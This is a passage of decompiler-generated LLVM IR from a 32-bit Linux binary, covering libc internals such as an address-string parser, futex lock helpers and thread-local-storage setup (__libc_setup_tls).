dec_label_pc_805513a:                             ; preds = %dec_label_pc_805512a
  %v4_805514e.pre = load i32, i32* @edx, align 4
  %v2_805514e35 = load i8, i8* %v1_805512a, align 1
  %v3_805514e36 = zext i8 %v2_805514e35 to i32
  %v5_805514e37 = and i32 %v4_805514e.pre, -256
  %v6_805514e38 = or i32 %v3_805514e36, %v5_805514e37
  store i32 %v6_805514e38, i32* @edx, align 4
  %v2_805515339 = mul nuw nsw i32 %v3_805514e36, 2
  %v3_805515340 = add i32 %v2_805515339, %v0_805512d.pre
  %v4_805515341 = inttoptr i32 %v3_805515340 to i16*
  %v5_805515342 = load i16, i16* %v4_805515341, align 2
  %v2_805515844 = and i16 %v5_805515342, 8
  %v3_805515845 = icmp eq i16 %v2_805515844, 0
  %v1_805515a46 = icmp eq i1 %v3_805515845, false
  br i1 %v1_805515a46, label %dec_label_pc_805513e, label %dec_label_pc_805515c

dec_label_pc_805513e:                             ; preds = %dec_label_pc_805513a, %dec_label_pc_805514d
  %v6_805514e50 = phi i32 [ %v6_805514e, %dec_label_pc_805514d ], [ %v6_805514e38, %dec_label_pc_805513a ]
  %v3_805514e49 = phi i32 [ %v3_805514e, %dec_label_pc_805514d ], [ %v3_805514e36, %dec_label_pc_805513a ]
  %v0_805514d48 = phi i32 [ %v1_805514d, %dec_label_pc_805514d ], [ %v0_805512a, %dec_label_pc_805513a ]
  %v1_805513e47 = phi i32 [ %v3_8055141, %dec_label_pc_805514d ], [ 0, %dec_label_pc_805513a ]
  %v3_805513e = mul i32 %v1_805513e47, 10
  %v2_8055141 = add i32 %v3_805513e, -48
  %v3_8055141 = add i32 %v2_8055141, %v3_805514e49
  %v1_8055145 = add i32 %v3_8055141, -255
  %v6_8055145 = sub i32 254, %v3_8055141
  %v7_8055145 = and i32 %v6_8055145, %v3_8055141
  %v8_8055145 = icmp slt i32 %v7_8055145, 0
  %v9_8055145 = icmp eq i32 %v1_8055145, 0
  %v10_8055145 = icmp slt i32 %v1_8055145, 0
  %v3_805514b = icmp eq i1 %v10_8055145, %v8_8055145
  %v4_805514b = icmp eq i1 %v9_8055145, false
  %v5_805514b = and i1 %v4_805514b, %v3_805514b
  br i1 %v5_805514b, label %dec_label_pc_805519c, label %dec_label_pc_805514d

dec_label_pc_805514d:                             ; preds = %dec_label_pc_805513e
  %v1_805514d = add i32 %v0_805514d48, 1
  %v1_805514e = inttoptr i32 %v1_805514d to i8*
  %v2_805514e = load i8, i8* %v1_805514e, align 1
  %v3_805514e = zext i8 %v2_805514e to i32
  %v5_805514e = and i32 %v6_805514e50, -256
  %v6_805514e = or i32 %v3_805514e, %v5_805514e
  store i32 %v6_805514e, i32* @edx, align 4
  %v2_8055153 = mul nuw nsw i32 %v3_805514e, 2
  %v3_8055153 = add i32 %v2_8055153, %v0_805512d.pre
  %v4_8055153 = inttoptr i32 %v3_8055153 to i16*
  %v5_8055153 = load i16, i16* %v4_8055153, align 2
  %v2_8055158 = and i16 %v5_8055153, 8
  %v3_8055158 = icmp eq i16 %v2_8055158, 0
  %v1_805515a = icmp eq i1 %v3_8055158, false
  br i1 %v1_805515a, label %dec_label_pc_805513e, label %dec_label_pc_805515c

dec_label_pc_805515c:                             ; preds = %dec_label_pc_805514d, %dec_label_pc_805513a
  %v1_805513e.lcssa = phi i32 [ 0, %dec_label_pc_805513a ], [ %v3_8055141, %dec_label_pc_805514d ]
  %v0_805514d.lcssa = phi i32 [ %v0_805512a, %dec_label_pc_805513a ], [ %v1_805514d, %dec_label_pc_805514d ]
  %v2_805514e.lcssa = phi i8 [ %v2_805514e35, %dec_label_pc_805513a ], [ %v2_805514e, %dec_label_pc_805514d ]
  %v6_8055153.lcssa.in = phi i16 [ %v5_805515342, %dec_label_pc_805513a ], [ %v5_8055153, %dec_label_pc_805514d ]
  %v11_805515c = icmp eq i32 %v2_8055176, 4
  br i1 %v11_805515c, label %dec_label_pc_805516a, label %dec_label_pc_8055162

dec_label_pc_8055162:                             ; preds = %dec_label_pc_805515c
  %v10_8055162 = icmp eq i8 %v2_805514e.lcssa, 46
  %v1_8055165 = icmp eq i1 %v10_8055162, false
  br i1 %v1_8055165, label %dec_label_pc_805519c, label %dec_label_pc_8055167

dec_label_pc_8055167:                             ; preds = %dec_label_pc_8055162
  %v1_8055167 = add i32 %v0_805514d.lcssa, 1
  br label %dec_label_pc_8055173

dec_label_pc_805516a:                             ; preds = %dec_label_pc_805515c
  %v1_805516a = add i32 %v0_805514d.lcssa, 1
  %v4_805516b = icmp eq i8 %v2_805514e.lcssa, 0
  br i1 %v4_805516b, label %dec_label_pc_8055173, label %dec_label_pc_805516f

dec_label_pc_805516f:                             ; preds = %dec_label_pc_805516a
  %v2_805516f = and i16 %v6_8055153.lcssa.in, 32
  %v3_805516f = icmp eq i16 %v2_805516f, 0
  br i1 %v3_805516f, label %dec_label_pc_805519c, label %dec_label_pc_8055173

dec_label_pc_8055173:                             ; preds = %dec_label_pc_805516f, %dec_label_pc_805516a, %dec_label_pc_8055167
  %v0_805512a4 = phi i32 [ %v1_805516a, %dec_label_pc_805516f ], [ %v1_805516a, %dec_label_pc_805516a ], [ %v1_8055167, %dec_label_pc_8055167 ]
  %v2_8055173 = mul i32 %v0_8055173, 256
  %v3_8055176 = add nuw nsw i32 %v2_8055176, 1
  %v2_8055179 = or i32 %v1_805513e.lcssa, %v2_8055173
  %v7_805517f = icmp sgt i32 %v2_8055176, 3
  br i1 %v7_805517f, label %dec_label_pc_8055181, label %dec_label_pc_805512a

dec_label_pc_8055181:                             ; preds = %dec_label_pc_8055173
  %v4_8055186 = icmp eq i32 %arg2, 0
  br i1 %v4_8055186, label %dec_label_pc_805519e, label %dec_label_pc_805518d

dec_label_pc_805518d:                             ; preds = %dec_label_pc_8055181
  %v1_8055191 = call i32 @llvm.bswap.i32(i32 %v2_8055179)
  %v2_8055193 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8055191, i32* %v2_8055193, align 4
  br label %dec_label_pc_805519e

dec_label_pc_805519c:                             ; preds = %dec_label_pc_805516f, %dec_label_pc_8055162, %dec_label_pc_805512a, %dec_label_pc_805513e, %entry
  br label %dec_label_pc_805519e

dec_label_pc_805519e:                             ; preds = %dec_label_pc_8055181, %dec_label_pc_805518d, %dec_label_pc_805519c
  %v0_80551a3 = phi i32 [ 1, %dec_label_pc_8055181 ], [ 1, %dec_label_pc_805518d ], [ 0, %dec_label_pc_805519c ]
  ret i32 %v0_80551a3

; uselistorder directives
  uselistorder i32 %v0_805514d.lcssa, { 1, 0 }
  uselistorder i32 %v6_805514e, { 1, 0 }
  uselistorder i32 %v3_805514e, { 2, 1, 0 }
  uselistorder i32 %v1_805514d, { 0, 2, 1 }
  uselistorder i32 %v1_8055145, { 1, 0 }
  uselistorder i32 %v3_8055141, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_8055176, { 0, 2, 1 }
  uselistorder i32 %v0_805512d.pre, { 1, 0, 2 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 63, 58, 59, 13, 14, 0, 15, 16, 17, 18, 61, 56, 19, 20, 21, 22, 23, 60, 57, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 62, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i8 46, { 0, 2, 1, 3 }
  uselistorder i32 -48, { 6, 5, 0, 1, 2, 3, 4 }
  uselistorder i32 10, { 4, 1, 59, 32, 33, 2, 18, 60, 0, 12, 13, 3, 9, 14, 10, 15, 20, 19, 5, 21, 22, 23, 24, 25, 26, 16, 27, 17, 28, 29, 30, 31, 34, 35, 36, 37, 38, 39, 40, 41, 42, 6, 43, 44, 7, 45, 46, 8, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 11 }
  uselistorder i8 8, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i8* null, { 35, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805519e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805519c, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805513e, { 1, 0 }
  uselistorder label %dec_label_pc_805512a, { 1, 0 }
}

define i32 @__lll_lock_wait_private() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80551b2 = load i32, i32* @esi, align 4
  store i32 %v0_80551b2, i32* %stack_var_-12, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  %v0_80551b8 = load i32, i32* @ecx, align 4
  store i32 %v0_80551b8, i32* %ebx.global-to-local, align 4
  %v0_80551c1 = load i32, i32* @eax, align 4
  %v12_80551c1 = icmp eq i32 %v0_80551c1, 2
  %v1_80551c3 = icmp eq i1 %v12_80551c1, false
  br i1 %v1_80551c3, label %dec_label_pc_80551cc, label %dec_label_pc_80551c5

dec_label_pc_80551c5:                             ; preds = %dec_label_pc_80551cc, %entry
  %v1_80551ca = call i32 @int80_syscall(i32 240)
  %v0_80551cc.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_80551ce.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80551cc

dec_label_pc_80551cc:                             ; preds = %dec_label_pc_80551c5, %entry
  %v0_80551ce = phi i32 [ %v0_80551ce.pre, %dec_label_pc_80551c5 ], [ %v0_80551b8, %entry ]
  %v0_80551cc = phi i32 [ %v0_80551cc.pre, %dec_label_pc_80551c5 ], [ 2, %entry ]
  %v1_80551ce = inttoptr i32 %v0_80551ce to i32*
  %v2_80551ce = load i32, i32* %v1_80551ce, align 4
  store i32 %v0_80551cc, i32* %v1_80551ce, align 4
  %v1_80551d0 = icmp eq i32 %v2_80551ce, 0
  %v1_80551d2 = icmp eq i1 %v1_80551d0, false
  br i1 %v1_80551d2, label %dec_label_pc_80551c5, label %dec_label_pc_80551d4

dec_label_pc_80551d4:                             ; preds = %dec_label_pc_80551cc
  %v2_80551d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80551d4, i32* @esi, align 4
  ret i32 %v2_80551ce

; uselistorder directives
  uselistorder i32* @ecx, { 139, 0, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 153, 154, 155, 156, 1, 157, 158, 54, 69, 197, 199, 70, 132, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 2, 171, 152, 172, 173, 174, 175, 7, 176, 177, 178, 179, 180, 3, 181, 182, 183, 184, 185, 186, 187, 188, 189, 4, 193, 190, 191, 192, 194, 195, 196, 8, 159, 9, 71, 72, 198, 73, 74, 75, 76, 77, 78, 79, 5, 135, 136, 137, 138, 80, 81, 6, 82, 133, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 97, 47, 48, 49, 50, 51, 52, 53, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 10, 134 }
  uselistorder i32 2, { 37, 26, 193, 191, 24, 192, 194, 0, 48, 27, 28, 195, 200, 58, 201, 49, 59, 100, 97, 198, 199, 1, 2, 3, 25, 196, 4, 5, 6, 50, 51, 197, 7, 8, 56, 60, 57, 63, 61, 62, 33, 32, 52, 64, 38, 65, 116, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 98, 117, 66, 88, 68, 67, 118, 119, 120, 121, 122, 69, 89, 29, 53, 90, 54, 55, 71, 72, 39, 70, 73, 74, 9, 75, 123, 124, 30, 34, 167, 168, 35, 125, 126, 127, 128, 129, 130, 131, 76, 91, 40, 132, 133, 134, 135, 136, 77, 41, 137, 138, 139, 140, 141, 142, 143, 78, 42, 144, 81, 79, 80, 92, 145, 146, 147, 148, 10, 149, 150, 11, 12, 13, 14, 15, 16, 82, 93, 43, 151, 152, 153, 17, 154, 155, 18, 19, 20, 21, 22, 83, 94, 44, 36, 156, 31, 23, 157, 158, 159, 160, 84, 95, 45, 161, 162, 164, 165, 166, 163, 85, 96, 46, 169, 170, 171, 172, 174, 175, 176, 173, 86, 47, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 99, 189, 190, 87 }
}

define i32 @__lll_unlock_wake_private() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80551e2 = load i32, i32* @edx, align 4
  store i32 %v0_80551e2, i32* %stack_var_-12, align 4
  %v0_80551e3 = load i32, i32* @eax, align 4
  %v1_80551e5 = inttoptr i32 %v0_80551e3 to i32*
  store i32 0, i32* %v1_80551e5, align 4
  %v1_80551fa = call i32 @int80_syscall(i32 240)
  %v2_80551fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80551fc, i32* @edx, align 4
  ret i32 %v1_80551fa

; uselistorder directives
  uselistorder i32 240, { 1, 2, 0, 3, 5, 4 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %v0_8055200 = load i32, i32* @global_var_805ae0c.352, align 4
  %v0_8055206 = load i32, i32* @eax, align 4
  store i32 %v0_8055206, i32* @global_var_805ae00.353, align 512
  %v1_805520b = add i32 %v0_8055200, 15
  %v0_805520e = load i32, i32* @edx, align 4
  store i32 %v0_805520e, i32* @global_var_805ae04.354, align 4
  %v2_8055214 = add i32 %v1_805520b, %v0_8055206
  %v0_8055216 = load i32, i32* @global_var_805ae08.355, align 8
  %v1_805521b = and i32 %v2_8055214, -16
  store i32 %v0_8055216, i32* @global_var_805ae1c.356, align 4
  store i32 %v1_805521b, i32* @global_var_805ae0c.352, align 4
  ret i32 %v0_8055216

; uselistorder directives
  uselistorder i32 %v0_8055216, { 1, 0 }
}

define i32 @_dl_tls_setup() local_unnamed_addr {
entry:
  store i32 16, i32* @edx, align 4
  store i32 1120, i32* @eax, align 4
  store i32 64, i32* @global_var_805a518.357, align 8
  store i32 1, i32* @global_var_805ae08.355, align 8
  store i32 ptrtoint (i32* @global_var_805a518.357 to i32), i32* @global_var_805ae10.358, align 16
  %v0_8055252 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @__libc_setup_tls(i32 %arg1, i64 %arg2) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i64, align 8
  %v0_805525b = load i32, i32* @edi, align 4
  %v0_805525c = load i32, i32* @esi, align 4
  %v0_805525d = load i32, i32* @ebx, align 4
  %v0_8055261 = load i32, i32* @global_var_805ae20.359, align 32
  %v4_8055267 = trunc i64 %arg2 to i32
  %v1_805526d = icmp eq i32 %v0_8055261, 0
  %v1_805526f = icmp eq i1 %v1_805526d, false
  br i1 %v1_805526f, label %dec_label_pc_805529c.preheader, label %dec_label_pc_80552ab

dec_label_pc_805529c.preheader:                   ; preds = %entry
  %v0_805529c.pre = load i32, i32* @global_var_805ae24.360, align 4
  %v2_80552a1 = mul i32 %v0_805529c.pre, 32
  %v2_80552a4 = add i32 %v2_80552a1, %v0_8055261
  %v7_80552a743 = icmp ult i32 %v0_8055261, %v2_80552a4
  br i1 %v7_80552a743, label %dec_label_pc_8055273, label %dec_label_pc_80552ab.loopexit

dec_label_pc_8055273:                             ; preds = %dec_label_pc_805529c.preheader, %dec_label_pc_8055299
  %v0_805528144 = phi i32 [ %v1_8055299, %dec_label_pc_8055299 ], [ %v0_8055261, %dec_label_pc_805529c.preheader ]
  %v1_8055273 = inttoptr i32 %v0_805528144 to i32*
  %v2_8055273 = load i32, i32* %v1_8055273, align 4
  %v11_8055273 = icmp eq i32 %v2_8055273, 7
  %v1_8055276 = icmp eq i1 %v11_8055273, false
  br i1 %v1_8055276, label %dec_label_pc_8055299, label %dec_label_pc_8055278

dec_label_pc_8055278:                             ; preds = %dec_label_pc_8055273
  %v1_8055278 = add i32 %v0_805528144, 20
  %v2_8055278 = inttoptr i32 %v1_8055278 to i32*
  %v3_8055278 = load i32, i32* %v2_8055278, align 4
  %v1_805527b = add i32 %v0_805528144, 28
  %v2_805527b = inttoptr i32 %v1_805527b to i32*
  %v3_805527b = load i32, i32* %v2_805527b, align 4
  store i32 %v3_805527b, i32* @esi, align 4
  %v4_805527e = sext i32 %v3_8055278 to i64
  store i64 %v4_805527e, i64* %stack_var_-44, align 8
  %v1_8055281 = add i32 %v0_805528144, 16
  %v2_8055281 = inttoptr i32 %v1_8055281 to i32*
  %v3_8055281 = load i32, i32* %v2_8055281, align 4
  %v1_8055284 = add i32 %v0_805528144, 8
  %v2_8055284 = inttoptr i32 %v1_8055284 to i32*
  %v3_8055284 = load i32, i32* %v2_8055284, align 4
  store i32 %v3_805527b, i32* %ebp.global-to-local, align 4
  %v8_8055293 = icmp ugt i32 %v3_805527b, %v4_8055267
  br i1 %v8_8055293, label %dec_label_pc_80552c6, label %dec_label_pc_8055295

dec_label_pc_8055295:                             ; preds = %dec_label_pc_8055278
  store i32 %v4_8055267, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80552c6

dec_label_pc_8055299:                             ; preds = %dec_label_pc_8055273
  %v1_8055299 = add i32 %v0_805528144, 32
  %v7_80552a7 = icmp ult i32 %v1_8055299, %v2_80552a4
  br i1 %v7_80552a7, label %dec_label_pc_8055273, label %dec_label_pc_80552ab.loopexit

dec_label_pc_80552ab.loopexit:                    ; preds = %dec_label_pc_8055299, %dec_label_pc_805529c.preheader
  br label %dec_label_pc_80552ab

dec_label_pc_80552ab:                             ; preds = %dec_label_pc_80552ab.loopexit, %entry
  store i32 %v4_8055267, i32* %ebp.global-to-local, align 4
  store i64 0, i64* %stack_var_-44, align 8
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80552c6

dec_label_pc_80552c6:                             ; preds = %dec_label_pc_8055278, %dec_label_pc_8055295, %dec_label_pc_80552ab
  %v0_80552e4 = phi i32 [ %v3_805527b, %dec_label_pc_8055278 ], [ %v4_8055267, %dec_label_pc_8055295 ], [ %v4_8055267, %dec_label_pc_80552ab ]
  %v2_80552c8.off0 = phi i32 [ %v3_8055278, %dec_label_pc_8055278 ], [ %v3_8055278, %dec_label_pc_8055295 ], [ 0, %dec_label_pc_80552ab ]
  %stack_var_-36.0 = phi i32 [ %v3_8055284, %dec_label_pc_8055278 ], [ %v3_8055284, %dec_label_pc_8055295 ], [ 0, %dec_label_pc_80552ab ]
  %stack_var_-40.0 = phi i32 [ %v3_8055281, %dec_label_pc_8055278 ], [ %v3_8055281, %dec_label_pc_8055295 ], [ 0, %dec_label_pc_80552ab ]
  %v1_80552cb = load i32, i32* @global_var_805ae0c.352, align 4
  %v2_80552cb = add i32 %v4_8055267, -1
  %v2_80552d1 = add i32 %v2_80552cb, %v2_80552c8.off0
  %v3_80552d1 = add i32 %v2_80552d1, %v1_80552cb
  %div = urem i32 %v3_80552d1, %v4_8055267
  %v4_80552e1 = sub i32 %v3_80552d1, %div
  store i32 %v4_80552e1, i32* @ebx, align 4
  %v2_80552e4 = add i32 %v0_80552e4, %arg1
  %v2_80552e8 = add i32 %v2_80552e4, %v4_80552e1
  %v1_80552eb = call i32 @__GI_sbrk(i32 %v2_80552e8)
  %v0_80552f0 = load i32, i32* %ebp.global-to-local, align 4
  store i32 62, i32* @global_var_805a318.361, align 8
  %v1_80552fc = sub i32 0, %v0_80552f0
  %v2_80552fe = add i32 %v1_80552eb, -1
  %v3_80552fe = add i32 %v2_80552fe, %v0_80552f0
  %v2_8055302 = and i32 %v3_80552fe, %v1_80552fc
  %v0_8055304 = load i32, i32* @esi, align 4
  %v1_8055304 = icmp eq i32 %v0_8055304, 0
  %v1_8055306 = load i32, i32* @ebx, align 4
  %v2_8055306 = add i32 %v1_8055306, %v2_8055302
  store i32 %v2_8055306, i32* %ebx.global-to-local, align 4
  br i1 %v1_8055304, label %dec_label_pc_8055315, label %dec_label_pc_805530c

dec_label_pc_805530c:                             ; preds = %dec_label_pc_80552c6
  %v1_805530c = add i32 %v0_8055304, -1
  br label %dec_label_pc_8055321

dec_label_pc_8055315:                             ; preds = %dec_label_pc_80552c6
  br label %dec_label_pc_8055321

dec_label_pc_8055321:                             ; preds = %dec_label_pc_805530c, %dec_label_pc_8055315
  %storemerge9 = phi i32 [ %v1_805530c, %dec_label_pc_805530c ], [ 0, %dec_label_pc_8055315 ]
  %storemerge8 = phi i32 [ %v0_8055304, %dec_label_pc_805530c ], [ 1, %dec_label_pc_8055315 ]
  %v3_8055321 = load i64, i64* %stack_var_-44, align 8
  %v4_8055321 = trunc i64 %v3_8055321 to i32
  %v5_8055321 = add i32 %v4_8055321, %storemerge9
  %tmp39 = urem i32 %v5_8055321, %storemerge8
  %v4_805532a47 = sub i32 %tmp39, %v5_8055321
  %v2_805532f = add i32 %v2_8055306, %v4_805532a47
  store i32 %v2_805532f, i32* @global_var_805a328.362, align 8
  br i1 %v1_8055304, label %dec_label_pc_8055343, label %dec_label_pc_805533a

dec_label_pc_805533a:                             ; preds = %dec_label_pc_8055321
  %v1_805533a = add i32 %v0_8055304, -1
  br label %dec_label_pc_805534f

dec_label_pc_8055343:                             ; preds = %dec_label_pc_8055321
  br label %dec_label_pc_805534f

dec_label_pc_805534f:                             ; preds = %dec_label_pc_805533a, %dec_label_pc_8055343
  %storemerge10 = phi i32 [ %v1_805533a, %dec_label_pc_805533a ], [ 0, %dec_label_pc_8055343 ]
  %storemerge7 = phi i32 [ %v0_8055304, %dec_label_pc_805533a ], [ 1, %dec_label_pc_8055343 ]
  %v5_805534f = add i32 %storemerge10, %v4_8055321
  store i8 1, i8* bitcast (i32* @global_var_805a32c.363 to i8*), align 4
  %div5 = urem i32 %v5_805534f, %storemerge7
  %v4_805535f = sub i32 %v5_805534f, %div5
  store i32 %v4_805535f, i32* @global_var_805a848.364, align 8
  %v3_8055376 = inttoptr i32 %v2_805532f to i8*
  %v4_8055376 = call i32 @memcpy(i8* %v3_8055376, i32 %stack_var_-36.0, i32 %stack_var_-40.0)
  %v0_805537b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805537b = add i32 %v0_805537b, 4
  %v2_805537b = inttoptr i32 %v1_805537b to i32*
  store i32 ptrtoint (i32* @global_var_805a320.365 to i32), i32* %v2_805537b, align 4
  %v0_8055382 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055382 = inttoptr i32 %v0_8055382 to i32*
  store i32 %v0_8055382, i32* %v2_8055382, align 4
  %v0_8055384 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055384 = add i32 %v0_8055384, 8
  %v3_8055384 = inttoptr i32 %v2_8055384 to i32*
  store i32 %v0_8055384, i32* %v3_8055384, align 4
  store i32 -1, i32* %stack_var_-32, align 4
  %v2_80553a8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80553a8, i32* %ebx.global-to-local, align 4
  %v1_80553ac = call i32 @int80_syscall(i32 243)
  %v1_80553b1 = icmp eq i32 %v1_80553ac, 0
  br i1 %v1_80553b1, label %dec_label_pc_80553ba, label %dec_label_pc_80553b5

dec_label_pc_80553b5:                             ; preds = %dec_label_pc_805534f
  %v0_80553b5 = call i32 @abort()
  br label %dec_label_pc_80553ba

dec_label_pc_80553ba:                             ; preds = %dec_label_pc_805534f, %dec_label_pc_80553b5
  %v2_80553c7 = load i64, i64* %stack_var_-44, align 8
  %v3_80553c7 = trunc i64 %v2_80553c7 to i32
  %v0_80553d2 = load i32, i32* @esi, align 4
  store i32 %v0_80553d2, i32* @global_var_805a840.366, align 64
  store i32 %v3_80553c7, i32* @global_var_805a83c.367, align 4
  store i32 %stack_var_-36.0, i32* @global_var_805a834.368, align 4
  store i32 %stack_var_-40.0, i32* @global_var_805a838.369, align 8
  store i32 1, i32* @global_var_805a84c.370, align 4
  store i32 64, i32* @global_var_805a518.357, align 8
  store i32 1, i32* @global_var_805ae08.355, align 8
  store i32 ptrtoint (i32* @global_var_805a518.357 to i32), i32* @global_var_805ae10.358, align 16
  store i32 ptrtoint (i32* @global_var_805a820.372 to i32), i32* @global_var_805a534.371, align 4
  %v1_805541b = icmp eq i32 %v0_80553d2, 0
  br i1 %v1_805541b, label %dec_label_pc_8055426, label %dec_label_pc_805541f

dec_label_pc_805541f:                             ; preds = %dec_label_pc_80553ba
  %v1_805541f = add i32 %v0_80553d2, -1
  br label %dec_label_pc_8055432

dec_label_pc_8055426:                             ; preds = %dec_label_pc_80553ba
  br label %dec_label_pc_8055432

dec_label_pc_8055432:                             ; preds = %dec_label_pc_805541f, %dec_label_pc_8055426
  %v1_805543b = phi i32 [ %v0_80553d2, %dec_label_pc_805541f ], [ 1, %dec_label_pc_8055426 ]
  %v0_8055432 = phi i32 [ %v1_805541f, %dec_label_pc_805541f ], [ 0, %dec_label_pc_8055426 ]
  %v5_8055432 = add i32 %v0_8055432, %v3_80553c7
  %div6 = urem i32 %v5_8055432, %v1_805543b
  %v4_805543b = sub i32 %v5_8055432, %div6
  %v0_805543e = load i32, i32* %ebp.global-to-local, align 4
  %v2_8055440 = icmp ult i32 %v0_805543e, 16
  %v1_8055443 = icmp eq i1 %v2_8055440, false
  br i1 %v1_8055443, label %dec_label_pc_805544a, label %dec_label_pc_8055445

dec_label_pc_8055445:                             ; preds = %dec_label_pc_8055432
  br label %dec_label_pc_805544a

dec_label_pc_805544a:                             ; preds = %dec_label_pc_8055432, %dec_label_pc_8055445
  %storemerge = phi i32 [ 16, %dec_label_pc_8055445 ], [ %v0_805543e, %dec_label_pc_8055432 ]
  store i32 %storemerge, i32* @edx, align 4
  %v5_805544a = add i32 %v4_805543b, %arg1
  store i32 %v5_805544a, i32* @eax, align 4
  %v0_805544e = call i32 @init_static_tls()
  store i32 %v0_805525d, i32* @ebx, align 4
  store i32 %v0_805525c, i32* @esi, align 4
  store i32 %v0_805525b, i32* @edi, align 4
  ret i32 %v0_805544e

; uselistorder directives
  uselistorder i32 %v0_8055384, { 1, 0 }
  uselistorder i32 %v0_8055382, { 1, 0 }
  uselistorder i32 %v2_805532f, { 1, 0 }
  uselistorder i32 %v0_8055304, { 1, 0, 3, 2, 4 }
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v1_8055299, { 1, 0 }
  uselistorder i32 %v3_805527b, { 0, 2, 1, 3 }
  uselistorder i32 %v3_8055278, { 1, 0, 2 }
  uselistorder i32 %v0_805528144, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v2_80552a4, { 1, 0 }
  uselistorder i32 %v4_8055267, { 1, 0, 2, 3, 6, 4, 5 }
  uselistorder i64* %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32* @edx, { 0, 22, 138, 139, 140, 135, 2, 4, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 5, 156, 157, 158, 159, 84, 86, 85, 87, 88, 168, 169, 175, 174, 166, 167, 12, 170, 171, 109, 23, 164, 6, 163, 162, 7, 160, 161, 165, 8, 67, 89, 90, 70, 71, 72, 172, 173, 91, 92, 9, 133, 134, 13, 93, 94, 110, 111, 3, 95, 10, 96, 14, 15, 16, 17, 18, 19, 20, 21, 1, 24, 11, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 61, 60, 97, 62, 63, 64, 65, 66, 68, 69, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 136, 137, 176 }
  uselistorder i32 64, { 23, 13, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 17, 18, 14, 15, 22, 12, 0, 11, 1, 16, 3, 4, 5, 6, 7, 19, 2, 8, 9, 20, 10, 21 }
  uselistorder i32 ()* @abort, { 5, 0, 1, 3, 4, 2 }
  uselistorder i32 62, { 9, 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32)* @__GI_sbrk, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 7, { 4, 19, 26, 0, 1, 2, 15, 20, 16, 21, 17, 22, 18, 23, 28, 27, 29, 30, 31, 32, 24, 33, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 34, 35, 14, 3 }
